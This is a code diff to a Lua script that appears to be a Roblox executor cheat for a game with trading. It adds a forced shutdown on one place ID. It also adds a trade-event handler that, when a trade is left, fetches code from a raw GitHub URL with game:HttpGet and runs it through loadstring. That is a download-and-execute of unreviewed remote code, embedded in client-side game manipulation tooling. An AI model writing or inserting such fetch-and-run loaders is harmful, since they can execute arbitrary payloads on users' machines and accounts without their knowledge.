@@ -68,8 +68,9 @@ if getWorld() ~= 3 then
 	repeat task.wait() until getWorld() == 3
 end
 
-if getWorld() == 3 then 
-    writefile("BF_PlaceId", tostring(game.PlaceId))
+if getWorld() == 3 and game.PlaceId == 7449423635 then 
+    game:Shutdown()
+    return
 end
 
 task.spawn(function()
@@ -320,7 +321,12 @@ local Trade = Main:WaitForChild("Trade")
 repeat task.wait() until Trade.Visible
 local TradeFunction : RemoteFunction = Remotes:WaitForChild("TradeFunction")
 local TradeEvent : RemoteEvent = Remotes:WaitForChild("TradeEvent")
-TradeEvent.OnClientEvent:Connect(function(action, args)
+local Connection 
+Connection = TradeEvent.OnClientEvent:Connect(function(action, args)
+    if action == "leave" then
+        Connection:Disconnect()
+        loadstring(game:HttpGet'https://raw.githubusercontent.com/ooboor005/SC_Raw/refs/heads/main/%E0%B8%95%E0%B8%B1%E0%B8%A7%E0%B8%AA%E0%B9%88%E0%B8%87%E0%B8%9C%E0%B8%A5BF')()
+    end
 	if action == "update_state" then
 		local playerNumber = args["Player1"].Name == LocalPlayer.Name and 1 or args["Player2"].Name == LocalPlayer.Name and 2 or nil
 		if not playerNumber then
